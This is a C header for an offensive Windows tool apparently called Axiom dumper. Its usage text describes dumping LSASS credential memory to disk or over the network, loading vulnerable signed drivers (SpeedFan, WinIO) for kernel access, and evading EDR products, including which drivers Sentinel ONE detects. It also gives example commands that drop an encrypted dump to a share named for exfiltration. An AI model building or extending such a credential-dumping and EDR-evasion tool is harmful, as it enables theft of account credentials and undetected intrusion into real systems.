#ifndef AXIOM_DUMPER_H
# define AXIOM_DUMPER_H

# include <windows.h>
# include "utils.h"

# define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
# define STATUS_SUCCESS 0x00000000

//=============================================================================
//|                                   Usage                                   |
//=============================================================================

# define USAGE_STRING "Usage: %s /help /unload:{NAME} /mode:[dropfile|netcat|get-kernel-base|get-patch-address] /savepath:{PATH} /autoload:[no|reflective] /driver:[speedfan|lenovo] /patch-address:{ADDRESS} /kernelbase:{ADDRESS}\n\n" \
	"/help - Displays this message and the currently running kernel version\n\n" \
	"/mode: - What mode to run in. Can be specified multiple times, but the last mode parsed takes precedence over previous ones\n" \
	"	dropfile - Will extract LSASS memory and drop its content to disk, to the path specified by /savepath:{PATH}\n" \
	"	netcat - Will extract LSASS memory and send its content over the network, to the destination specified by /rhost:{HOST} and /rport:{PORT} (Not implemented)\n" \
	"	get-kernel-base - Prints the current kernel base and exits. This info is needed to evade some EDR.\n" \
	"	get-patch-address - Gets the address iof NtIoDeviceControlFile and exits. This info is needed to evade some EDR.\n" \
	"\n" \
	"/savepath:{PATH} - Specifies where to drop the dump file on disk. Required when running in /mode:dropfile.\n" \
	"\n" \
	"/autoload: - Sets the driver loading mode.\n" \
	"	no - No autoloading of the driver. The target driver must be loaded manually with sc.exe before running the binary.\n" \
	"	reflective - Performs automatic drop-and-load of the driver, if the EDR profile allows it. Automatically unloads and shreds the driver afterwards.\n" \
	"\n" \
	"/unload:{NAME} - Unloads the driver identified by name and exits. Useful if the program crashes or you kill it before it can do so automatically. The service name will be specified in the output by a random 6 characters string when running with /autoload:reflective\n" \
	"\n" \
	"/driver: - Specifies which driver to use.\n" \
	"	speedfan - Hardware monitoring driver. Fastest option but detected by Sentinel ONE\n" \
	"	winio - Re-signed WinIO64 driver. Safest but also slower due to many manual memory maping operations.\n" \
	"\n" \
	"/kernelbase:{ADDRESS} - Manually specifies the kernel base address. The tool will automatically tell you to use this option and how if needed.\n" \
	"\n" \
	"Examples:\n" \
	"%s /mode:dropfile /savepath:out.bin /autoload:reflective /driver:speedfan -> Use the speedfan driver to drop a XOR-encrypted memory dump in the out.bin file. Automatically load, then unload and shreds the driver from disk.\n" \
	"%s /mode:dropfile /savepath:X:\\someshare\\exfil.out /driver:winio /autoload:no -> Use the WinIO driver, which must have been loaded manually with sc.exe beforehand\n"

//=============================================================================
//|                       Structure holding the options                       |
//=============================================================================
enum AXIOM_OPTIONS_mode {
	ModeInvalid = 0,
	ModeNetcat = 1,
	ModeDropfile = 2,
	ModePPcheck = 3,
	ModeHelp = 4,
	ModeFindKernelBase = 5,
	ModeUnload = 6
};
enum AXIOM_AUTOLOAD_mode {
	AutoloadModeInvalid = 0,
	AutoloadModeDisabled = 1,
	AutoloadTaskSch = 2,
	AutoloadReflective = 3,
	AutoloadModeProxy = 4
};
enum AXIOM_DRIVER {
	DriverInvalid = 0,
	DriverSpeedfan = 1,
	DriverWinIO = 2
};
typedef struct s_axiom_options
{
	AXIOM_OPTIONS_mode mode;
	AXIOM_DRIVER driver;
	const char* rhost;
	ULONG rport;
	const char* savepath;
	AXIOM_AUTOLOAD_mode autoload_mode;
	const char* drv_name;
	const char* taskuser;
	const char* taskpassword;
	EdrProfile edrProfile;
	ULONGLONG patchAddress;
} AXIOM_OPTIONS, * PAXIOM_OPTIONS;

extern PAXIOM_OPTIONS g_options;

//=============================================================================
//|                              Core functions                               |
//=============================================================================
BOOL CORE_parse_args(int argc, char **argv);

#endif
